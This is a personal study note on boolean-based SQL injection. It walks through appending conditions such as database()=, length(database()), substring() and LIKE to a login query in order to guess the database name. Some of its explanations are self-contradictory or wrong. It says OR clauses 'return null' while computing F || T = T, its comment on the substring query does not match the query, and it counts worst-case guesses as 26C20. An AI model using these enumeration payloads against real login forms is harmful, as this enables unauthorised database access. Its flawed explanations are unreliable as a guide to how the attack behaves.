# boolean-based sql injection
* send a SQL query to the db and judge whether the payload used returns true or false
* depending on the result (true or false), the content within the HTTP response will change or remain the same
* it is a slow attack; this helps the attacker to enumerate the db
* relies on keywords and functions eg `LIKE`, `LENGTH` etc
* say you have the db from [1-sql][def]
    * say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* the query in the BE will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* we can use said query to retrieve unauthorised info eg. db name, host username, hostname, db version etc
    * say the username-password pair above is in the db. we can add a query viz

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        and database()="login"; --assume db name is `login`
        -- returns the user because both the uname-password pair and
        -- the db name evaluates to `true`. T && T = T
    ```

    * say the username-password pair above is not in the db. we can add a query viz

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or database()="login"; --assume db name is `login`
        -- returns null because both the uname-password pair evaluates to `false` and
        -- the db name evaluates to `true`. F || T = T
    ```

* all nice and dandy, however, we are working under the assumption that we already have the db name. how do we get it?
    * eaa...sy! use the `LENGTH` function to find the length of the name of the db (is it beginning to look like a brute-force attack?)

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or length(database())="1";
        -- returns null because the length of the db name evaluates to `false` (name of db is not one char long)
    ```

    - you can keep doing `length(database())="N";` where N = {1, 2, ...}, however, is this, really, necessary? say the length of the db name is 20 characters; are you sure you want to do this? say you want to do this; are you sure you want to run <sup>26</sup>C<sub>20</sub> combinations, worst case scenario? (assuming db name is composed solely of the 26 letters of the [latin script][def2])

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or substring(database(),1,1)="a";
        -- returns null because the `substring(...)=="1"` bit evaluates to `false` (the first letter of the db name is not `a`)
    ```

    - you can use `LIKE` if you want...

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        or database() like "%a%";
        -- returns null because the `database() like "%a%"` bit evaluates to `false` (the db name does not contain the letter `a`)
    ```

    - 
    
[def]: ./1-sql.md
[def2]: https://en.wikipedia.org/wiki/Latin_script